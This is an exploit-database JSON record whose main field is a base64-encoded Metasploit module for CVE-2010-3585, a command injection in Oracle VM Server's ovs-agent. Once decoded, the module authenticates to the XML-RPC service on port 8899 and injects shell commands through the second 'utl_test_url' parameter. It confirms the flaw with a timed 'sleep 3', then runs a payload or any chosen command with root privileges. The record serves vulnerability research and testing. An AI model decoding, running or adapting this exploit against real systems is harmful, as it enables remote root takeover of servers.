{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBvcmFjbGVfdm1fYWdlbnRfdXRsLnJiIDEwODIxIDIwMTAtMTAtMjUgMjA6NTg6NDlaIGpkdWNrICQNCiMjDQoNCiMjDQojIFRoaXMgZmlsZSBpcyBwYXJ0IG9mIHRoZSBNZXRhc3Bsb2l0IEZyYW1ld29yayBhbmQgbWF5IGJlIHN1YmplY3QgdG8NCiMgcmVkaXN0cmlidXRpb24gYW5kIGNvbW1lcmNpYWwgcmVzdHJpY3Rpb25zLiBQbGVhc2Ugc2VlIHRoZSBNZXRhc3Bsb2l0DQojIEZyYW1ld29yayB3ZWIgc2l0ZSBmb3IgbW9yZSBpbmZvcm1hdGlvbiBvbiBsaWNlbnNpbmcgYW5kIHRlcm1zIG9mIHVzZS4NCiMgaHR0cDovL21ldGFzcGxvaXQuY29tL2ZyYW1ld29yay8NCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoJUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KCWRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCgkJc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICAgPT4gJ09yYWNsZSBWTSBTZXJ2ZXIgVmlydHVhbCBTZXJ2ZXIgQWdlbnQgQ29tbWFuZCBJbmplY3Rpb24nLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBjb21tYW5kIGluamVjdGlvbiBmbGF3IHdpdGhpbiBPcmFjbGVcJ3MgVk0gU2VydmVyDQoJCQkJVmlydHVhbCBTZXJ2ZXIgQWdlbnQgKG92cy1hZ2VudCkgc2VydmljZS4NCg0KCQkJCUJ5IGluY2x1ZGluZyBzaGVsbCBtZXRhIGNoYXJhY3RlcnMgd2l0aGluIHRoZSBzZWNvbmQgcGFyYW1ldGVyIHRvIHRoZSAndXRsX3Rlc3RfdXJsJw0KCQkJCVhNTC1SUEMgbWV0aG9kQ2FsbCwgYW4gYXR0YWNrZXIgY2FuIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvbW1hbmRzLiBUaGUgc2VydmljZQ0KCQkJCXR5cGljYWxseSBydW5zIHdpdGggcm9vdCBwcml2aWxlZ2VzLg0KDQoJCQkJTk9URTogVmFsaWQgY3JlZGVudGlhbHMgYXJlIHJlcXVpcmVkIHRvIHRyaWdnZXIgdGhpcyB2dWxuZXJhYmxlLiBUaGUgdXNlcm5hbWUNCgkJCQlhcHBlYXJzIHRvIGJlIGhhcmRjb2RlZCBhcyAnb3JhY2xlJywgYnV0IHRoZSBwYXNzd29yZCBpcyBzZXQgYnkgdGhlIGFkbWluaXN0cmF0b3INCgkJCQlhdCBpbnN0YWxsYXRpb24gdGltZS4NCgkJCX0sDQoJCQknQXV0aG9yJyAgICAgICAgID0+IFsgJ2pkdWNrJyBdLA0KCQkJJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdWZXJzaW9uJyAgICAgICAgPT4gJyRSZXZpc2lvbjogMTA4MjEgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQkjIG92cy1hZ2VudC5zcGVjOi0gRml4IG92cyBhZ2VudCBjb21tYW5kIGluamVjdGlvbiBbb3JhYnVnIDEwMTQ2NjQ0XSB7Q1ZFLTIwMTAtMzU4NX0NCgkJCQkJWydDVkUnLCAnMjAxMC0zNTg1J10sDQoJCQkJCVsnT1NWREInLCAnNjg3OTcnXSwNCgkJCQkJWydCSUQnLCAnNDQwNDcnXQ0KCQkJCV0sDQoJCQknUHJpdmlsZWdlZCcgICAgID0+IHRydWUsDQoJCQknUGxhdGZvcm0nICAgICAgID0+IFsndW5peCcsICdsaW51eCddLA0KCQkJJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX0NNRCwNCgkJCSdQYXlsb2FkJyAgICAgICAgPT4NCgkJCQl7DQoJCQkJCSdTcGFjZScgPT4gNTEyLA0KCQkJCQknQmFkQ2hhcnMnID0+ICc8PicsDQoJCQkJCSdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCgkJCQkJJ0tleXMnICA9PiBbJ2NtZCcsICdjbWRfYmFzaCddLA0KCQkJCX0sDQoJCQknVGFyZ2V0cycgICAgICAgID0+IFsgWydBdXRvbWF0aWMnLCB7IH1dLCBdLA0KCQkJJ0RlZmF1bHRUYXJnZXQnID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdPY3QgMTIgMjAxMCcNCgkJCSkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHQ6OlJQT1JUKDg4OTkpLA0KCQkJCU9wdEJvb2wubmV3KCdTU0wnLCBbIHRydWUsICdVc2UgU1NMJywgdHJ1ZSBdKSwNCgkJCQlPcHRTdHJpbmcubmV3KCdDTUQnLCBbIGZhbHNlLCAgIkEgc2luZ2xlIGNvbW1hbmQgdG8gZXhlY3V0ZSBpbnN0ZWFkIG9mIHRoZSBwYXlsb2FkIiBdKSwNCgkJCQlPcHRTdHJpbmcubmV3KCdVU0VSTkFNRScsIFsgdHJ1ZSwgICJUaGUgdXNlciB0byBhdXRoZW50aWNhdGUgYXMiLCAnb3JhY2xlJ10pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyB0cnVlLCAgIlRoZSBwYXNzd29yZCB0byBhdXRoZW50aWNhdGUgd2l0aCIgXSkNCgkJCV0sIHNlbGYuY2xhc3MpDQoNCgkJZGVyZWdpc3Rlcl9vcHRpb25zKA0KCQkJJ0hUVFA6Omp1bmtfcGFyYW1zJywgIyBub3QgeW91ciB0eXBpY2FsIFBPU1QsIHNvIGRvbid0IGluamVjdCBwYXJhbXMuDQoJCQknSFRUUDo6anVua19zbGFzaGVzJyAjIEZvciBzb21lIHJlYXNvbiBqdW5rX3NsYXNoZXMgZG9lc24ndCBhbHdheXMgd29yaywgc28gdHVybiB0aGF0IG9mZiBmb3Igbm93Lg0KCQkJKQ0KCWVuZA0KDQoJZGVmIGdvKGNvbW1hbmQpDQoJCWRhdGFzdG9yZVsnQmFzaWNBdXRoVXNlciddID0gZGF0YXN0b3JlWydVU0VSTkFNRSddDQoJCWRhdGFzdG9yZVsnQmFzaWNBdXRoUGFzcyddID0gZGF0YXN0b3JlWydQQVNTV09SRCddDQoNCgkJeG1sID0gPDwtRU9TDQo8P3htbCB2ZXJzaW9uPSIxLjAiPz4NCjxtZXRob2RDYWxsPg0KPG1ldGhvZE5hbWU+dXRsX3Rlc3RfdXJsPC9tZXRob2ROYW1lPg0KPHBhcmFtcz48cGFyYW0+DQo8dmFsdWU+PHN0cmluZz5QQVJBTTE8L3N0cmluZz48L3ZhbHVlPg0KPC9wYXJhbT48L3BhcmFtcz4NCjxwYXJhbXM+PHBhcmFtPg0KPHZhbHVlPjxzdHJpbmc+UEFSQU0yPC9zdHJpbmc+PC92YWx1ZT4NCjwvcGFyYW0+PC9wYXJhbXM+DQo8cGFyYW1zPjxwYXJhbT4NCjx2YWx1ZT48c3RyaW5nPlBBUkFNMzwvc3RyaW5nPjwvdmFsdWU+DQo8L3BhcmFtPjwvcGFyYW1zPg0KPHBhcmFtcz48cGFyYW0+DQo8dmFsdWU+PHN0cmluZz5QQVJBTTQ8L3N0cmluZz48L3ZhbHVlPg0KPC9wYXJhbT48L3BhcmFtcz4NCjwvbWV0aG9kQ2FsbD4NCkVPUw0KDQoJCXNwbG9pdCA9IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMocmFuZCgxMjgpKzMyKQ0KCQlzcGxvaXQgPDwgIic7IiArIGNvbW1hbmQgKyAiOyciDQoNCgkJeG1sLmdzdWIhKC9QQVJBTTEvLCAnaHR0cDovLycgKyByYW5kX3RleHRfYWxwaGFudW1lcmljKHJhbmQoMTI4KSszMikgKyAnLycpDQoJCXhtbC5nc3ViISgvUEFSQU0yLywgc3Bsb2l0KQ0KCQl4bWwuZ3N1YiEoL1BBUkFNMy8sIHJhbmRfdGV4dF9hbHBoYW51bWVyaWMocmFuZCgxMjgpKzMyKSkNCgkJeG1sLmdzdWIhKC9QQVJBTTQvLCByYW5kX3RleHRfYWxwaGFudW1lcmljKHJhbmQoMTI4KSszMikpDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCgkJCXsNCgkJCQkndXJpJyAgICAgICAgICA9PiAnL1JQQzInLA0KCQkJCSdtZXRob2QnICAgICAgID0+ICdQT1NUJywNCgkJCQknY3R5cGUnICAgICAgICA9PiAnYXBwbGljYXRpb24veG1sJywNCgkJCQknZGF0YScgICAgICAgICA9PiB4bWwsDQoJCQl9LCA1KQ0KDQoJCWlmIG5vdCByZXMNCgkJCWlmIG5vdCBzZXNzaW9uX2NyZWF0ZWQ/DQoJCQkJcHJpbnRfZXJyb3IoJ1VuYWJsZSB0byBjb21wbGV0ZSBYTUwtUlBDIHJlcXVlc3QnKQkNCgkJCQlyZXR1cm4gbmlsDQoJCQllbmQNCgkJCQ0KCQkJIyBubyByZXNwb25zZSwgYnV0IHNlc3Npb24gY3JlYXRlZCEhIQ0KCQkJcmV0dXJuIHRydWUNCgkJZW5kDQoNCgkJY2FzZSByZXMuY29kZQ0KCQl3aGVuIDQwMw0KCQkJcHJpbnRfZXJyb3IoJ0F1dGhlbnRpY2F0aW9uIGZhaWxlZCEnKQ0KCQkJcmV0dXJuIG5pbA0KDQoJCXdoZW4gMjAwDQoJCQlwcmludF9nb29kKCdPdXIgcmVxdWVzdCB3YXMgYWNjZXB0ZWQhJykNCgkJCXJldHVybiByZXMNCg0KCQllbmQNCg0KCQlwcmludF9lcnJvcigiRW5jb3VudGVyZWQgdW5leHBlY3RlZCAje3Jlcy5jb2RlfSByZXBvbnNlOiIpDQoJCXByaW50X2Vycm9yKHJlcy5pbnNwZWN0KQ0KDQoJCXJldHVybiBuaWwNCgllbmQNCg0KCWRlZiBjaGVjaw0KCQlwcmludF9zdGF0dXMoIkF0dGVtcHRpbmcgdG8gZGV0ZWN0IGlmIHRoZSBzZXJ2ZXIgaXMgdnVsbmVyYWJsZS4uLiIpDQoNCgkJIyBUcnkgcnVubmluZy90aW1pbmcgc2xlZXAgMw0KCQlzdGFydCA9IFRpbWUubm93DQoJCWdvKCdzbGVlcCAzJykNCgkJZWxhcHNlZCA9IFRpbWUubm93IC0gc3RhcnQNCgkJaWYgZWxhcHNlZCA+PSAzIGFuZCBlbGFwc2VkIDw9IDQNCgkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCgkJZW5kDQoNCgkJcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KCWVuZA0KDQoJZGVmIGV4cGxvaXQNCgkJcHJpbnRfc3RhdHVzKCJBdHRlbXB0aW5nIHRvIGV4ZWN1dGUgdGhlIHBheWxvYWQuLi4iKQ0KDQoJCWNtZCA9IGRhdGFzdG9yZVsnQ01EJ10NCgkJY21kIHx8PSBwYXlsb2FkLmVuY29kZWQNCg0KCQlpZiBub3QgZ28oY21kKQ0KCQkJcmFpc2UgUnVudGltZUVycm9yLCAiVW5hYmxlIHRvIGV4ZWN1dGUgdGhlIGRlc2lyZWQgY29tbWFuZCINCgkJZW5kDQoNCgkJaGFuZGxlcg0KCWVuZA0KDQplbmQ=", 
    "filename": "platforms/linux/remote/16915.rb", 
    "id": "16915", 
    "cves": [
        "CVE-2010-3585"
    ]
}